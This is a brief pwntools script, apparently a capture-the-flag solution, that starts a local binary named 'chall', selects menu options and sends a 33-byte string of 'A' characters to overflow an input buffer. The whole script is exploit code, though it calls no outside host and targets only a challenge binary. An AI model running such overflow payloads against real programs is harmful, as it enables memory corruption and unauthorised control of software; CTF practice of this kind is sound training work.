from pwn import *

p=process('./chall')

print( p.recv().decode("utf-8")+"\n")
p.write("2\n")
p.write("A"*33+"\n")

print( p.recv().decode("utf-8")+"\n")

p.write("4\n")
#p.interactive()
print( p.recv().decode("utf-8")+"\n")
